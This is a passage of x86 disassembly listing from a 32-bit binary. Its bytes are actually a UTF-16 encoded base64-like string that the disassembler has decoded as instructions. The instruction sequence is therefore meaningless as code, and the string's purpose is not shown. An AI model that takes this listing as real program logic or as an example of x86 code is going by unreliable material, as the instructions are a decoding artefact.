  40a360:	67 00 46 00          	add    %al,0x0(%bp)
  40a364:	71 00                	jno    0x40a366
  40a366:	51                   	push   %ecx
  40a367:	00 4b 00             	add    %cl,0x0(%ebx)
  40a36a:	69 00 34 00 76 00    	imul   $0x760034,(%eax),%eax
  40a370:	37                   	aaa
  40a371:	00 49 00             	add    %cl,0x0(%ecx)
  40a374:	38 00                	cmp    %al,(%eax)
  40a376:	59                   	pop    %ecx
  40a377:	00 76 00             	add    %dh,0x0(%esi)
  40a37a:	48                   	dec    %eax
  40a37b:	00 65 00             	add    %ah,0x0(%ebp)
  40a37e:	44                   	inc    %esp
  40a37f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a382:	63 00                	arpl   %eax,(%eax)
  40a384:	42                   	inc    %edx
  40a385:	00 41 00             	add    %al,0x0(%ecx)
  40a388:	35 00 78 00 77       	xor    $0x77007800,%eax
  40a38d:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40a391:	00 49 00             	add    %cl,0x0(%ecx)
  40a394:	47                   	inc    %edi
  40a395:	00 66 00             	add    %ah,0x0(%esi)
  40a398:	69 00 43 00 6e 00    	imul   $0x6e0043,(%eax),%eax
  40a39e:	6c                   	insb   (%dx),%es:(%edi)
  40a39f:	00 4a 00             	add    %cl,0x0(%edx)
  40a3a2:	61                   	popa
  40a3a3:	00 41 00             	add    %al,0x0(%ecx)
  40a3a6:	44                   	inc    %esp
  40a3a7:	00 42 00             	add    %al,0x0(%edx)
  40a3aa:	59                   	pop    %ecx
  40a3ab:	00 52 00             	add    %dl,0x0(%edx)
  40a3ae:	79 00                	jns    0x40a3b0
  40a3b0:	68 00 48 00 62       	push   $0x62004800
  40a3b5:	00 56 00             	add    %dl,0x0(%esi)
  40a3b8:	4f                   	dec    %edi
  40a3b9:	00 78 00             	add    %bh,0x0(%eax)
  40a3bc:	69 00 65 00 2f 00    	imul   $0x2f0065,(%eax),%eax
  40a3c2:	4f                   	dec    %edi
  40a3c3:	00 41 00             	add    %al,0x0(%ecx)
  40a3c6:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  40a3ca:	75 00                	jne    0x40a3cc
  40a3cc:	64 00 5a 00          	add    %bl,%fs:0x0(%edx)
  40a3d0:	53                   	push   %ebx
  40a3d1:	00 58 00             	add    %bl,0x0(%eax)
  40a3d4:	71 00                	jno    0x40a3d6
  40a3d6:	45                   	inc    %ebp
  40a3d7:	00 47 00             	add    %al,0x0(%edi)
  40a3da:	4e                   	dec    %esi
  40a3db:	00 41 00             	add    %al,0x0(%ecx)
  40a3de:	34 00                	xor    $0x0,%al
  40a3e0:	57                   	push   %edi
  40a3e1:	00 41 00             	add    %al,0x0(%ecx)
  40a3e4:	57                   	push   %edi
  40a3e5:	00 48 00             	add    %cl,0x0(%eax)
  40a3e8:	4b                   	dec    %ebx
  40a3e9:	00 4d 00             	add    %cl,0x0(%ebp)
  40a3ec:	62 00                	bound  %eax,(%eax)
  40a3ee:	59                   	pop    %ecx
  40a3ef:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40a3f3:	00 48 00             	add    %cl,0x0(%eax)
  40a3f6:	49                   	dec    %ecx
  40a3f7:	00 68 00             	add    %ch,0x0(%eax)
  40a3fa:	62 00                	bound  %eax,(%eax)
  40a3fc:	6d                   	insl   (%dx),%es:(%edi)
  40a3fd:	00 41 00             	add    %al,0x0(%ecx)
  40a400:	71 00                	jno    0x40a402
  40a402:	70 00                	jo     0x40a404
  40a404:	63 00                	arpl   %eax,(%eax)
  40a406:	69 00 6d 00 4f 00    	imul   $0x4f006d,(%eax),%eax
  40a40c:	58                   	pop    %eax
  40a40d:	00 2f                	add    %ch,(%edi)
  40a40f:	00 77 00             	add    %dh,0x0(%edi)
  40a412:	2b 00                	sub    (%eax),%eax
  40a414:	6f                   	outsl  %ds:(%esi),(%dx)
  40a415:	00 76 00             	add    %dh,0x0(%esi)
  40a418:	32 00                	xor    (%eax),%al
  40a41a:	5a                   	pop    %edx
  40a41b:	00 2b                	add    %ch,(%ebx)
  40a41d:	00 4c 00 4e          	add    %cl,0x4e(%eax,%eax,1)
  40a421:	00 4b 00             	add    %cl,0x0(%ebx)
  40a424:	4c                   	dec    %esp
  40a425:	00 63 00             	add    %ah,0x0(%ebx)
  40a428:	58                   	pop    %eax
  40a429:	00 38                	add    %bh,(%eax)
  40a42b:	00 58 00             	add    %bl,0x0(%eax)
  40a42e:	47                   	inc    %edi
  40a42f:	00 39                	add    %bh,(%ecx)
  40a431:	00 57 00             	add    %dl,0x0(%edi)
  40a434:	69 00 74 00 64 00    	imul   $0x640074,(%eax),%eax
  40a43a:	46                   	inc    %esi
  40a43b:	00 47 00             	add    %al,0x0(%edi)
  40a43e:	79 00                	jns    0x40a440
  40a440:	6f                   	outsl  %ds:(%esi),(%dx)
  40a441:	00 48 00             	add    %cl,0x0(%eax)
  40a444:	43                   	inc    %ebx
  40a445:	00 5a 00             	add    %bl,0x0(%edx)
  40a448:	51                   	push   %ecx
  40a449:	00 6a 00             	add    %ch,0x0(%edx)
  40a44c:	49                   	dec    %ecx
  40a44d:	00 76 00             	add    %dh,0x0(%esi)
  40a450:	73 00                	jae    0x40a452
  40a452:	54                   	push   %esp
  40a453:	00 78 00             	add    %bh,0x0(%eax)
  40a456:	33 00                	xor    (%eax),%eax
  40a458:	68 00 7a 00 38       	push   $0x38007a00
  40a45d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a460:	78 00                	js     0x40a462
  40a462:	72 00                	jb     0x40a464
  40a464:	70 00                	jo     0x40a466
  40a466:	75 00                	jne    0x40a468
  40a468:	33 00                	xor    (%eax),%eax
  40a46a:	36 00 41 00          	add    %al,%ss:0x0(%ecx)
  40a46e:	35 00 59 00 39       	xor    $0x39005900,%eax
  40a473:	00 48 00             	add    %cl,0x0(%eax)
  40a476:	32 00                	xor    (%eax),%al
  40a478:	2f                   	das
  40a479:	00 61 00             	add    %ah,0x0(%ecx)
  40a47c:	31 00                	xor    %eax,(%eax)
  40a47e:	57                   	push   %edi
  40a47f:	00 33                	add    %dh,(%ebx)
  40a481:	00 47 00             	add    %al,0x0(%edi)
  40a484:	39 00                	cmp    %eax,(%eax)
  40a486:	78 00                	js     0x40a488
  40a488:	45                   	inc    %ebp
  40a489:	00 61 00             	add    %ah,0x0(%ecx)
  40a48c:	69 00 37 00 42 00    	imul   $0x420037,(%eax),%eax
  40a492:	2b 00                	sub    (%eax),%eax
  40a494:	4d                   	dec    %ebp
  40a495:	00 6a 00             	add    %ch,0x0(%edx)
  40a498:	51                   	push   %ecx
  40a499:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  40a49d:	00 54 00 79          	add    %dl,0x79(%eax,%eax,1)
  40a4a1:	00 55 00             	add    %dl,0x0(%ebp)
  40a4a4:	6c                   	insb   (%dx),%es:(%edi)
  40a4a5:	00 31                	add    %dh,(%ecx)
  40a4a7:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a4ab:	00 46 00             	add    %al,0x0(%esi)
  40a4ae:	65 00 33             	add    %dh,%gs:(%ebx)
  40a4b1:	00 6d 00             	add    %ch,0x0(%ebp)
  40a4b4:	36 00 38             	add    %bh,%ss:(%eax)
  40a4b7:	00 71 00             	add    %dh,0x0(%ecx)
  40a4ba:	6c                   	insb   (%dx),%es:(%edi)
  40a4bb:	00 53 00             	add    %dl,0x0(%ebx)
  40a4be:	72 00                	jb     0x40a4c0
  40a4c0:	52                   	push   %edx
  40a4c1:	00 6d 00             	add    %ch,0x0(%ebp)
  40a4c4:	44                   	inc    %esp
  40a4c5:	00 68 00             	add    %ch,0x0(%eax)
  40a4c8:	6a 00                	push   $0x0
  40a4ca:	38 00                	cmp    %al,(%eax)
  40a4cc:	71 00                	jno    0x40a4ce
  40a4ce:	4f                   	dec    %edi
  40a4cf:	00 2b                	add    %ch,(%ebx)
  40a4d1:	00 41 00             	add    %al,0x0(%ecx)
  40a4d4:	72 00                	jb     0x40a4d6
  40a4d6:	70 00                	jo     0x40a4d8
  40a4d8:	6d                   	insl   (%dx),%es:(%edi)
  40a4d9:	00 4a 00             	add    %cl,0x0(%edx)
  40a4dc:	4c                   	dec    %esp
  40a4dd:	00 44 00 74          	add    %al,0x74(%eax,%eax,1)
  40a4e1:	00 58 00             	add    %bl,0x0(%eax)
  40a4e4:	51                   	push   %ecx
  40a4e5:	00 59 00             	add    %bl,0x0(%ecx)
  40a4e8:	77 00                	ja     0x40a4ea
  40a4ea:	43                   	inc    %ebx
  40a4eb:	00 35 00 7a 00 68    	add    %dh,0x68007a00
  40a4f1:	00 6d 00             	add    %ch,0x0(%ebp)
  40a4f4:	79 00                	jns    0x40a4f6
  40a4f6:	72 00                	jb     0x40a4f8
  40a4f8:	61                   	popa
  40a4f9:	00 36                	add    %dh,(%esi)
  40a4fb:	00 53 00             	add    %dl,0x0(%ebx)
  40a4fe:	52                   	push   %edx
  40a4ff:	00 79 00             	add    %bh,0x0(%ecx)
  40a502:	51                   	push   %ecx
  40a503:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
  40a507:	00 4a 00             	add    %cl,0x0(%edx)
  40a50a:	72 00                	jb     0x40a50c
  40a50c:	6d                   	insl   (%dx),%es:(%edi)
  40a50d:	00 50 00             	add    %dl,0x0(%eax)
  40a510:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  40a514:	68 00 57 00 4e       	push   $0x4e005700
  40a519:	00 47 00             	add    %al,0x0(%edi)
  40a51c:	38 00                	cmp    %al,(%eax)
  40a51e:	37                   	aaa
  40a51f:	00 69 00             	add    %ch,0x0(%ecx)
  40a522:	6f                   	outsl  %ds:(%esi),(%dx)
  40a523:	00 4c 00 77          	add    %cl,0x77(%eax,%eax,1)
  40a527:	00 55 00             	add    %dl,0x0(%ebp)
  40a52a:	48                   	dec    %eax
  40a52b:	00 57 00             	add    %dl,0x0(%edi)
  40a52e:	6c                   	insb   (%dx),%es:(%edi)
  40a52f:	00 37                	add    %dh,(%edi)
  40a531:	00 47 00             	add    %al,0x0(%edi)
  40a534:	6e                   	outsb  %ds:(%esi),(%dx)
  40a535:	00 68 00             	add    %ch,0x0(%eax)
  40a538:	74 00                	je     0x40a53a
  40a53a:	75 00                	jne    0x40a53c
  40a53c:	62 00                	bound  %eax,(%eax)
  40a53e:	57                   	push   %edi
  40a53f:	00 47 00             	add    %al,0x0(%edi)
  40a542:	62 00                	bound  %eax,(%eax)
  40a544:	52                   	push   %edx
  40a545:	00 69 00             	add    %ch,0x0(%ecx)
  40a548:	73 00                	jae    0x40a54a
  40a54a:	4f                   	dec    %edi
  40a54b:	00 42 00             	add    %al,0x0(%edx)
  40a54e:	50                   	push   %eax
  40a54f:	00 6e 00             	add    %ch,0x0(%esi)
  40a552:	50                   	push   %eax
  40a553:	00 4d 00             	add    %cl,0x0(%ebp)
  40a556:	4b                   	dec    %ebx
  40a557:	00 47 00             	add    %al,0x0(%edi)
  40a55a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a55b:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  40a55f:	00 47 00             	add    %al,0x0(%edi)
  40a562:	4b                   	dec    %ebx
  40a563:	00 71 00             	add    %dh,0x0(%ecx)
  40a566:	42                   	inc    %edx
  40a567:	00 59 00             	add    %bl,0x0(%ecx)
  40a56a:	6c                   	insb   (%dx),%es:(%edi)
  40a56b:	00 35 00 6f 00 56    	add    %dh,0x56006f00
  40a571:	00 6f 00             	add    %ch,0x0(%edi)
  40a574:	48                   	dec    %eax
  40a575:	00 5a 00             	add    %bl,0x0(%edx)
  40a578:	45                   	inc    %ebp
  40a579:	00 6d 00             	add    %ch,0x0(%ebp)
  40a57c:	55                   	push   %ebp
  40a57d:	00 51 00             	add    %dl,0x0(%ecx)
  40a580:	6a 00                	push   $0x0
  40a582:	53                   	push   %ebx
  40a583:	00 4f 00             	add    %cl,0x0(%edi)
  40a586:	73 00                	jae    0x40a588
  40a588:	4a                   	dec    %edx
  40a589:	00 57 00             	add    %dl,0x0(%edi)
  40a58c:	68 00 73 00 76       	push   $0x76007300
  40a591:	00 2f                	add    %ch,(%edi)
  40a593:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
  40a597:	00 45 00             	add    %al,0x0(%ebp)
  40a59a:	48                   	dec    %eax
  40a59b:	00 6e 00             	add    %ch,0x0(%esi)
  40a59e:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  40a5a1:	00 56 00             	add    %dl,0x0(%esi)
  40a5a4:	4b                   	dec    %ebx
  40a5a5:	00 65 00             	add    %ah,0x0(%ebp)
  40a5a8:	39 00                	cmp    %eax,(%eax)
  40a5aa:	58                   	pop    %eax
  40a5ab:	00 77 00             	add    %dh,0x0(%edi)
  40a5ae:	39 00                	cmp    %eax,(%eax)
  40a5b0:	6c                   	insb   (%dx),%es:(%edi)
  40a5b1:	00 38                	add    %bh,(%eax)
  40a5b3:	00 4b 00             	add    %cl,0x0(%ebx)
  40a5b6:	47                   	inc    %edi
  40a5b7:	00 56 00             	add    %dl,0x0(%esi)
  40a5ba:	55                   	push   %ebp
  40a5bb:	00 51 00             	add    %dl,0x0(%ecx)
  40a5be:	56                   	push   %esi
  40a5bf:	00 6a 00             	add    %ch,0x0(%edx)
  40a5c2:	54                   	push   %esp
  40a5c3:	00 58 00             	add    %bl,0x0(%eax)
  40a5c6:	41                   	inc    %ecx
  40a5c7:	00 57 00             	add    %dl,0x0(%edi)
  40a5ca:	44                   	inc    %esp
  40a5cb:	00 37                	add    %dh,(%edi)
  40a5cd:	00 57 00             	add    %dl,0x0(%edi)
  40a5d0:	59                   	pop    %ecx
  40a5d1:	00 6b 00             	add    %ch,0x0(%ebx)
  40a5d4:	30 00                	xor    %al,(%eax)
  40a5d6:	6a 00                	push   $0x0
  40a5d8:	78 00                	js     0x40a5da
  40a5da:	34 00                	xor    $0x0,%al
  40a5dc:	61                   	popa
  40a5dd:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
  40a5e1:	00 52 00             	add    %dl,0x0(%edx)
  40a5e4:	58                   	pop    %eax
  40a5e5:	00 72 00             	add    %dh,0x0(%edx)
  40a5e8:	4a                   	dec    %edx
  40a5e9:	00 69 00             	add    %ch,0x0(%ecx)
  40a5ec:	78 00                	js     0x40a5ee
  40a5ee:	78 00                	js     0x40a5f0
  40a5f0:	35 00 30 00 72       	xor    $0x72003000,%eax
  40a5f5:	00 31                	add    %dh,(%ecx)
  40a5f7:	00 6e 00             	add    %ch,0x0(%esi)
  40a5fa:	35 00 45 00 66       	xor    $0x66004500,%eax
  40a5ff:	00 76 00             	add    %dh,0x0(%esi)
  40a602:	42                   	inc    %edx
  40a603:	00 75 00             	add    %dh,0x0(%ebp)
  40a606:	4a                   	dec    %edx
  40a607:	00 2f                	add    %ch,(%edi)
  40a609:	00 6b 00             	add    %ch,0x0(%ebx)
  40a60c:	69 00 37 00 58 00    	imul   $0x580037,(%eax),%eax
  40a612:	37                   	aaa
  40a613:	00 74 00 45          	add    %dh,0x45(%eax,%eax,1)
  40a617:	00 68 00             	add    %ch,0x0(%eax)
  40a61a:	53                   	push   %ebx
  40a61b:	00 6e 00             	add    %ch,0x0(%esi)
  40a61e:	68 00 7a 00 66       	push   $0x66007a00
  40a623:	00 6e 00             	add    %ch,0x0(%esi)
  40a626:	2f                   	das
  40a627:	00 49 00             	add    %cl,0x0(%ecx)
  40a62a:	2b 00                	sub    (%eax),%eax
  40a62c:	33 00                	xor    (%eax),%eax
  40a62e:	45                   	inc    %ebp
  40a62f:	00 39                	add    %bh,(%ecx)
  40a631:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
  40a635:	00 4c 00 33          	add    %cl,0x33(%eax,%eax,1)
  40a639:	00 68 00             	add    %ch,0x0(%eax)
  40a63c:	74 00                	je     0x40a63e
  40a63e:	2f                   	das
  40a63f:	00 55 00             	add    %dl,0x0(%ebp)
  40a642:	4f                   	dec    %edi
  40a643:	00 68 00             	add    %ch,0x0(%eax)
  40a646:	4d                   	dec    %ebp
  40a647:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
  40a64b:	00 56 00             	add    %dl,0x0(%esi)
  40a64e:	77 00                	ja     0x40a650
  40a650:	79 00                	jns    0x40a652
  40a652:	32 00                	xor    (%eax),%al
  40a654:	37                   	aaa
  40a655:	00 2b                	add    %ch,(%ebx)
  40a657:	00 55 00             	add    %dl,0x0(%ebp)
  40a65a:	4f                   	dec    %edi
  40a65b:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
  40a65f:	00 73 00             	add    %dh,0x0(%ebx)
  40a662:	6a 00                	push   $0x0
  40a664:	46                   	inc    %esi
  40a665:	00 31                	add    %dh,(%ecx)
  40a667:	00 6b 00             	add    %ch,0x0(%ebx)
  40a66a:	50                   	push   %eax
  40a66b:	00 78 00             	add    %bh,0x0(%eax)
  40a66e:	74 00                	je     0x40a670
  40a670:	4e                   	dec    %esi
  40a671:	00 42 00             	add    %al,0x0(%edx)
  40a674:	72 00                	jb     0x40a676
  40a676:	2f                   	das
  40a677:	00 61 00             	add    %ah,0x0(%ecx)
  40a67a:	46                   	inc    %esi
  40a67b:	00 55 00             	add    %dl,0x0(%ebp)
  40a67e:	78 00                	js     0x40a680
  40a680:	6d                   	insl   (%dx),%es:(%edi)
  40a681:	00 4d 00             	add    %cl,0x0(%ebp)
  40a684:	30 00                	xor    %al,(%eax)
  40a686:	58                   	pop    %eax
  40a687:	00 47 00             	add    %al,0x0(%edi)
  40a68a:	6c                   	insb   (%dx),%es:(%edi)
  40a68b:	00 2f                	add    %ch,(%edi)
  40a68d:	00 5a 00             	add    %bl,0x0(%edx)
  40a690:	70 00                	jo     0x40a692
  40a692:	63 00                	arpl   %eax,(%eax)
  40a694:	4c                   	dec    %esp
  40a695:	00 79 00             	add    %bh,0x0(%ecx)
  40a698:	34 00                	xor    $0x0,%al
  40a69a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a69b:	00 45 00             	add    %al,0x0(%ebp)
  40a69e:	72 00                	jb     0x40a6a0
  40a6a0:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  40a6a4:	58                   	pop    %eax
  40a6a5:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40a6a9:	00 31                	add    %dh,(%ecx)
  40a6ab:	00 5a 00             	add    %bl,0x0(%edx)
  40a6ae:	4c                   	dec    %esp
  40a6af:	00 79 00             	add    %bh,0x0(%ecx)
  40a6b2:	30 00                	xor    %al,(%eax)
  40a6b4:	41                   	inc    %ecx
  40a6b5:	00 65 00             	add    %ah,0x0(%ebp)
  40a6b8:	74 00                	je     0x40a6ba
  40a6ba:	61                   	popa
  40a6bb:	00 78 00             	add    %bh,0x0(%eax)
  40a6be:	74 00                	je     0x40a6c0
  40a6c0:	53                   	push   %ebx
  40a6c1:	00 45 00             	add    %al,0x0(%ebp)
  40a6c4:	43                   	inc    %ebx
  40a6c5:	00 57 00             	add    %dl,0x0(%edi)
  40a6c8:	57                   	push   %edi
  40a6c9:	00 6e 00             	add    %ch,0x0(%esi)
  40a6cc:	4c                   	dec    %esp
  40a6cd:	00 31                	add    %dh,(%ecx)
  40a6cf:	00 71 00             	add    %dh,0x0(%ecx)
  40a6d2:	45                   	inc    %ebp
  40a6d3:	00 52 00             	add    %dl,0x0(%edx)
  40a6d6:	35 00 6b 00 30       	xor    $0x30006b00,%eax
  40a6db:	00 65 00             	add    %ah,0x0(%ebp)
  40a6de:	36 00 41 00          	add    %al,%ss:0x0(%ecx)
  40a6e2:	35 00 65 00 52       	xor    $0x52006500,%eax
  40a6e7:	00 38                	add    %bh,(%eax)
  40a6e9:	00 70 00             	add    %dh,0x0(%eax)
  40a6ec:	7a 00                	jp     0x40a6ee
  40a6ee:	67 00 44 00          	add    %al,0x0(%si)
  40a6f2:	4e                   	dec    %esi
  40a6f3:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
  40a6f7:	00 4f 00             	add    %cl,0x0(%edi)
  40a6fa:	58                   	pop    %eax
  40a6fb:	00 6e 00             	add    %ch,0x0(%esi)
  40a6fe:	75 00                	jne    0x40a700
  40a700:	4a                   	dec    %edx
  40a701:	00 49 00             	add    %cl,0x0(%ecx)
  40a704:	6b 00 4a             	imul   $0x4a,(%eax),%eax
  40a707:	00 75 00             	add    %dh,0x0(%ebp)
  40a70a:	76 00                	jbe    0x40a70c
  40a70c:	72 00                	jb     0x40a70e
  40a70e:	4e                   	dec    %esi
  40a70f:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  40a713:	00 4e 00             	add    %cl,0x0(%esi)
  40a716:	56                   	push   %esi
  40a717:	00 2f                	add    %ch,(%edi)
  40a719:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
  40a71d:	00 31                	add    %dh,(%ecx)
  40a71f:	00 57 00             	add    %dl,0x0(%edi)
  40a722:	52                   	push   %edx
  40a723:	00 6d 00             	add    %ch,0x0(%ebp)
  40a726:	4b                   	dec    %ebx
  40a727:	00 37                	add    %dh,(%edi)
  40a729:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  40a72d:	00 46 00             	add    %al,0x0(%esi)
  40a730:	31 00                	xor    %eax,(%eax)
  40a732:	63 00                	arpl   %eax,(%eax)
  40a734:	76 00                	jbe    0x40a736
  40a736:	30 00                	xor    %al,(%eax)
  40a738:	54                   	push   %esp
  40a739:	00 61 00             	add    %ah,0x0(%ecx)
  40a73c:	30 00                	xor    %al,(%eax)
  40a73e:	61                   	popa
  40a73f:	00 51 00             	add    %dl,0x0(%ecx)
  40a742:	57                   	push   %edi
  40a743:	00 6f 00             	add    %ch,0x0(%edi)
  40a746:	76 00                	jbe    0x40a748
  40a748:	4c                   	dec    %esp
  40a749:	00 70 00             	add    %dh,0x0(%eax)
  40a74c:	44                   	inc    %esp
  40a74d:	00 59 00             	add    %bl,0x0(%ecx)
  40a750:	72 00                	jb     0x40a752
  40a752:	38 00                	cmp    %al,(%eax)
  40a754:	53                   	push   %ebx
  40a755:	00 42 00             	add    %al,0x0(%edx)
  40a758:	4c                   	dec    %esp
  40a759:	00 71 00             	add    %dh,0x0(%ecx)
  40a75c:	6d                   	insl   (%dx),%es:(%edi)
  40a75d:	00 33                	add    %dh,(%ebx)
  40a75f:	00 66 00             	add    %ah,0x0(%esi)
  40a762:	66 00 39             	data16 add %bh,(%ecx)
  40a765:	00 69 00             	add    %ch,0x0(%ecx)
  40a768:	4e                   	dec    %esi
  40a769:	00 35 00 73 00 73    	add    %dh,0x73007300
  40a76f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a772:	6c                   	insb   (%dx),%es:(%edi)
  40a773:	00 30                	add    %dh,(%eax)
  40a775:	00 46 00             	add    %al,0x0(%esi)
  40a778:	51                   	push   %ecx
  40a779:	00 45 00             	add    %al,0x0(%ebp)
  40a77c:	77 00                	ja     0x40a77e
  40a77e:	61                   	popa
  40a77f:	00 64 00 78          	add    %ah,0x78(%eax,%eax,1)
  40a783:	00 63 00             	add    %ah,0x0(%ebx)
  40a786:	6e                   	outsb  %ds:(%esi),(%dx)
  40a787:	00 71 00             	add    %dh,0x0(%ecx)
  40a78a:	41                   	inc    %ecx
  40a78b:	00 36                	add    %dh,(%esi)
  40a78d:	00 4b 00             	add    %cl,0x0(%ebx)
  40a790:	75 00                	jne    0x40a792
  40a792:	47                   	inc    %edi
  40a793:	00 50 00             	add    %dl,0x0(%eax)
  40a796:	4c                   	dec    %esp
  40a797:	00 51 00             	add    %dl,0x0(%ecx)
  40a79a:	55                   	push   %ebp
  40a79b:	00 4e 00             	add    %cl,0x0(%esi)
  40a79e:	4d                   	dec    %ebp
  40a79f:	00 41 00             	add    %al,0x0(%ecx)
  40a7a2:	7a 00                	jp     0x40a7a4
  40a7a4:	61                   	popa
  40a7a5:	00 2f                	add    %ch,(%edi)
  40a7a7:	00 48 00             	add    %cl,0x0(%eax)
  40a7aa:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7ab:	00 6b 00             	add    %ch,0x0(%ebx)
  40a7ae:	79 00                	jns    0x40a7b0
  40a7b0:	79 00                	jns    0x40a7b2
  40a7b2:	4e                   	dec    %esi
  40a7b3:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  40a7b7:	00 2f                	add    %ch,(%edi)
  40a7b9:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  40a7bd:	00 71 00             	add    %dh,0x0(%ecx)
  40a7c0:	62 00                	bound  %eax,(%eax)
  40a7c2:	69 00 42 00 57 00    	imul   $0x570042,(%eax),%eax
  40a7c8:	62 00                	bound  %eax,(%eax)
  40a7ca:	38 00                	cmp    %al,(%eax)
  40a7cc:	59                   	pop    %ecx
  40a7cd:	00 38                	add    %bh,(%eax)
  40a7cf:	00 57 00             	add    %dl,0x0(%edi)
  40a7d2:	70 00                	jo     0x40a7d4
  40a7d4:	34 00                	xor    $0x0,%al
  40a7d6:	79 00                	jns    0x40a7d8
  40a7d8:	39 00                	cmp    %eax,(%eax)
  40a7da:	52                   	push   %edx
  40a7db:	00 49 00             	add    %cl,0x0(%ecx)
  40a7de:	70 00                	jo     0x40a7e0
  40a7e0:	42                   	inc    %edx
  40a7e1:	00 59 00             	add    %bl,0x0(%ecx)
  40a7e4:	57                   	push   %edi
  40a7e5:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a7e8:	47                   	inc    %edi
  40a7e9:	00 6b 00             	add    %ch,0x0(%ebx)
  40a7ec:	34 00                	xor    $0x0,%al
  40a7ee:	2f                   	das
  40a7ef:	00 4d 00             	add    %cl,0x0(%ebp)
  40a7f2:	36 00 69 00          	add    %ch,%ss:0x0(%ecx)
  40a7f6:	6a 00                	push   $0x0
  40a7f8:	47                   	inc    %edi
  40a7f9:	00 78 00             	add    %bh,0x0(%eax)
  40a7fc:	49                   	dec    %ecx
  40a7fd:	00 30                	add    %dh,(%eax)
  40a7ff:	00 67 00             	add    %ah,0x0(%edi)
  40a802:	71 00                	jno    0x40a804
  40a804:	76 00                	jbe    0x40a806
  40a806:	2b 00                	sub    (%eax),%eax
  40a808:	48                   	dec    %eax
  40a809:	00 36                	add    %dh,(%esi)
  40a80b:	00 33                	add    %dh,(%ebx)
  40a80d:	00 41 00             	add    %al,0x0(%ecx)
  40a810:	6e                   	outsb  %ds:(%esi),(%dx)
  40a811:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
  40a815:	00 68 00             	add    %ch,0x0(%eax)
  40a818:	4d                   	dec    %ebp
  40a819:	00 2b                	add    %ch,(%ebx)
  40a81b:	00 32                	add    %dh,(%edx)
  40a81d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a820:	35 00 71 00 77       	xor    $0x77007100,%eax
  40a825:	00 30                	add    %dh,(%eax)
  40a827:	00 6e 00             	add    %ch,0x0(%esi)
  40a82a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a82b:	00 72 00             	add    %dh,0x0(%edx)
  40a82e:	39 00                	cmp    %eax,(%eax)
  40a830:	59                   	pop    %ecx
  40a831:	00 73 00             	add    %dh,0x0(%ebx)
  40a834:	31 00                	xor    %eax,(%eax)
  40a836:	45                   	inc    %ebp
  40a837:	00 52 00             	add    %dl,0x0(%edx)
  40a83a:	74 00                	je     0x40a83c
  40a83c:	32 00                	xor    (%eax),%al
  40a83e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a83f:	00 6f 00             	add    %ch,0x0(%edi)
  40a842:	6f                   	outsl  %ds:(%esi),(%dx)
  40a843:	00 62 00             	add    %ah,0x0(%edx)
  40a846:	72 00                	jb     0x40a848
  40a848:	71 00                	jno    0x40a84a
  40a84a:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40a84e:	77 00                	ja     0x40a850
  40a850:	59                   	pop    %ecx
  40a851:	00 46 00             	add    %al,0x0(%esi)
  40a854:	7a 00                	jp     0x40a856
  40a856:	59                   	pop    %ecx
  40a857:	00 73 00             	add    %dh,0x0(%ebx)
  40a85a:	33 00                	xor    (%eax),%eax
  40a85c:	7a 00                	jp     0x40a85e
  40a85e:	59                   	pop    %ecx
  40a85f:	00 48 00             	add    %cl,0x0(%eax)
  40a862:	32 00                	xor    (%eax),%al
  40a864:	56                   	push   %esi
  40a865:	00 47 00             	add    %al,0x0(%edi)
  40a868:	33 00                	xor    (%eax),%eax
  40a86a:	42                   	inc    %edx
  40a86b:	00 63 00             	add    %ah,0x0(%ebx)
  40a86e:	71 00                	jno    0x40a870
  40a870:	58                   	pop    %eax
  40a871:	00 36                	add    %dh,(%esi)
  40a873:	00 43 00             	add    %al,0x0(%ebx)
  40a876:	79 00                	jns    0x40a878
  40a878:	73 00                	jae    0x40a87a
  40a87a:	57                   	push   %edi
  40a87b:	00 4d 00             	add    %cl,0x0(%ebp)
  40a87e:	47                   	inc    %edi
  40a87f:	00 67 00             	add    %ah,0x0(%edi)
  40a882:	49                   	dec    %ecx
  40a883:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  40a887:	00 4b 00             	add    %cl,0x0(%ebx)
  40a88a:	37                   	aaa
  40a88b:	00 66 00             	add    %ah,0x0(%esi)
  40a88e:	63 00                	arpl   %eax,(%eax)
  40a890:	43                   	inc    %ebx
  40a891:	00 65 00             	add    %ah,0x0(%ebp)
  40a894:	33 00                	xor    (%eax),%eax
  40a896:	54                   	push   %esp
  40a897:	00 58 00             	add    %bl,0x0(%eax)
  40a89a:	4a                   	dec    %edx
  40a89b:	00 38                	add    %bh,(%eax)
  40a89d:	00 49 00             	add    %cl,0x0(%ecx)
  40a8a0:	36 00 67 00          	add    %ah,%ss:0x0(%edi)
  40a8a4:	30 00                	xor    %al,(%eax)
